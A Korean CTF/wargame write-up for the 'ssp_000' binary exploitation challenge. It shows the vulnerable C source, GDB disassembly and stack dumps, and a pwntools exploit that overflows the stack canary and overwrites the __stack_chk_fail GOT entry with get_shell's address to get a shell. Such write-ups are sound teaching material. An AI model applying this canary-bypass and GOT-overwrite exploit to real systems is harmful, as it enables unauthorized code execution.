### Description
```
이 문제는 작동하고 있는 서비스(ssp_000)의 바이너리와 소스코드가 주어집니다.
프로그램의 취약점을 찾고 SSP 방어 기법을 우회하여 익스플로잇해 셸을 획득한 후, “flag” 파일을 읽으세요.
“flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{…} 입니다.
```

### Environment
```
Ubuntu 16.04
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

---

### Challenge Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {
    long addr;
    long value;
    char buf[0x40] = {};

    initialize();


    read(0, buf, 0x80);

    printf("Addr : ");
    scanf("%ld", &addr);
    printf("Value : ");
    scanf("%ld", &value);

    *(long *)addr = value;

    return 0;
}

```

- Shell을 띄워주는 get_shell 함수 존재
- read(0, buf, 0x80) <- Buffer Overflow 발생
- 임의 주소에 원하는 값을 쓸 수 있는 기능 존재

---

### GDB - Canary Check
#### Main Disassemble
```bash
pwndbg> disass main
Dump of assembler code for function main:
   0x00000000004008fb <+0>:	push   rbp
   0x00000000004008fc <+1>:	mov    rbp,rsp
   0x00000000004008ff <+4>:	sub    rsp,0x70
   0x0000000000400903 <+8>:	mov    DWORD PTR [rbp-0x64],edi
   0x0000000000400906 <+11>:	mov    QWORD PTR [rbp-0x70],rsi
   0x000000000040090a <+15>:	mov    rax,QWORD PTR fs:0x28
   0x0000000000400913 <+24>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400917 <+28>:	xor    eax,eax
   0x0000000000400919 <+30>:	lea    rdx,[rbp-0x50]
   0x000000000040091d <+34>:	mov    eax,0x0
   0x0000000000400922 <+39>:	mov    ecx,0x8
   0x0000000000400927 <+44>:	mov    rdi,rdx
   0x000000000040092a <+47>:	rep stos QWORD PTR es:[rdi],rax
   0x000000000040092d <+50>:	mov    eax,0x0
   0x0000000000400932 <+55>:	call   0x40088e <initialize>
   0x0000000000400937 <+60>:	lea    rax,[rbp-0x50]
   0x000000000040093b <+64>:	mov    edx,0x80
   0x0000000000400940 <+69>:	mov    rsi,rax
   0x0000000000400943 <+72>:	mov    edi,0x0
   0x0000000000400948 <+77>:	call   0x400710 <read@plt>
   0x000000000040094d <+82>:	mov    edi,0x400a55
   0x0000000000400952 <+87>:	mov    eax,0x0
   0x0000000000400957 <+92>:	call   0x4006f0 <printf@plt>
   0x000000000040095c <+97>:	lea    rax,[rbp-0x60]
   0x0000000000400960 <+101>:	mov    rsi,rax
   0x0000000000400963 <+104>:	mov    edi,0x400a5d
   0x0000000000400968 <+109>:	mov    eax,0x0
   0x000000000040096d <+114>:	call   0x400750 <__isoc99_scanf@plt>
   0x0000000000400972 <+119>:	mov    edi,0x400a61
   0x0000000000400977 <+124>:	mov    eax,0x0
   0x000000000040097c <+129>:	call   0x4006f0 <printf@plt>
   0x0000000000400981 <+134>:	lea    rax,[rbp-0x58]
   0x0000000000400985 <+138>:	mov    rsi,rax
   0x0000000000400988 <+141>:	mov    edi,0x400a5d
   0x000000000040098d <+146>:	mov    eax,0x0
   0x0000000000400992 <+151>:	call   0x400750 <__isoc99_scanf@plt>
   0x0000000000400997 <+156>:	mov    rax,QWORD PTR [rbp-0x60]
   0x000000000040099b <+160>:	mov    rdx,rax
   0x000000000040099e <+163>:	mov    rax,QWORD PTR [rbp-0x58]
   0x00000000004009a2 <+167>:	mov    QWORD PTR [rdx],rax
   0x00000000004009a5 <+170>:	mov    eax,0x0
   0x00000000004009aa <+175>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000004009ae <+179>:	xor    rcx,QWORD PTR fs:0x28
   0x00000000004009b7 <+188>:	je     0x4009be <main+195>
   0x00000000004009b9 <+190>:	call   0x4006d0 <__stack_chk_fail@plt>
   0x00000000004009be <+195>:	leave
   0x00000000004009bf <+196>:	ret
End of assembler dump.
```

Canary를 확인하기 위해 read를 call 할 때 브레이크를 걸음   
```bash
pwndbg> b *0x400948
Breakpoint 1 at 0x400948
```
실행 후 rsi를 살펴보면 Canary의 값이 나옴
```bash
pwndbg> i r rsi
rsi            0x7fffffffe500      140737488348416

pwndbg> x/40gx 0x7fffffffe500
0x7fffffffe500:	0x0000000000000000	0x0000000000000000
0x7fffffffe510:	0x0000000000000000	0x0000000000000000
0x7fffffffe520:	0x0000000000000000	0x0000000000000000
0x7fffffffe530:	0x0000000000000000	0x0000000000000000
0x7fffffffe540:	0x00007fffffffe640	0xbc4e37ff8cf61100 <<<--- Canary
0x7fffffffe550:	0x0000000000000000	0x00007ffff7df4083
0x7fffffffe560:	0x00007ffff7ffc620	0x00007fffffffe648
0x7fffffffe570:	0x0000000100000000	0x00000000004008fb
0x7fffffffe580:	0x00000000004009c0	0xa6e21c46ae91d089
0x7fffffffe590:	0x0000000000400780	0x00007fffffffe640
0x7fffffffe5a0:	0x0000000000000000	0x0000000000000000
0x7fffffffe5b0:	0x591de3b96451d089	0x591df3f82effd089
0x7fffffffe5c0:	0x0000000000000000	0x0000000000000000
0x7fffffffe5d0:	0x0000000000000000	0x0000000000000001
0x7fffffffe5e0:	0x00007fffffffe648	0x00007fffffffe658
0x7fffffffe5f0:	0x00007ffff7ffe190	0x0000000000000000
0x7fffffffe600:	0x0000000000000000	0x0000000000400780
0x7fffffffe610:	0x00007fffffffe640	0x0000000000000000
0x7fffffffe620:	0x0000000000000000	0x00000000004007a9
0x7fffffffe630:	0x00007fffffffe638	0x000000000000001c
```

즉, 80바이트를 넣으면 Canary를 덮을 수 있음

---

### Exploit 과정
먼저 위에서 main을 Disassemble했을 때 stack chk fail 함수를 부브는 부분이 ret 직전에 존재함
```bash
   0x00000000004009ae <+179>:	xor    rcx,QWORD PTR fs:0x28
   0x00000000004009b7 <+188>:	je     0x4009be <main+195>
   0x00000000004009b9 <+190>:	call   0x4006d0 <__stack_chk_fail@plt>
   0x00000000004009be <+195>:	leave
   0x00000000004009bf <+196>:	ret
```

위 함수를 부르기 전 임의의 주소에 값을 받음   
-> 아래 C 코드는 해당 글 최상단에 Challenge Code에 존재
```c 
printf("Addr : ");
scanf("%ld", &addr);
printf("Value : ");
scanf("%ld", &value);
```

Canary를 변조하면 무조건 stack chk fail이 실행됨

그러므로 처음에 nop을 80바이트를 넣어 Canary를 변조하고 임의의 주소에 값을 받을때 Addr에 <code>stack_chk_fail</code>의 got를 넣고 value에 <code>get_shell</code>의 함수를 넣으면 Shell을 실행할 수 있음

--- 
### get_shell Address Check
```bash
pwndbg> info func get_shell
All functions matching regular expression "get_shell":

Non-debugging symbols:
0x00000000004008ea  get_shell
```

get_shell 주소 : 0x4008ea

---
### Exploit Code
```python
from pwn import *

conn = process("./ssp_000")
e = ELF("./ssp_000")

conn.sendline(b"A" * 80)

conn.recvuntil("r : ")

conn.sendline(str(e.got['__stack_chk_fail']))

conn.recvuntil("e : ")

conn.sendline(str(0x4008ea))

conn.interactive()
```

```bash
❯ python3 ex.py
[+] Starting local process './ssp_000': pid 1174
[*] '/root/ssp_000'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
ex.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  conn.recvuntil("r : ")
ex.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  conn.sendline(str(e.got['__stack_chk_fail']))
ex.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  conn.recvuntil("e : ")
ex.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  conn.sendline(str(0x4008ea))
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
```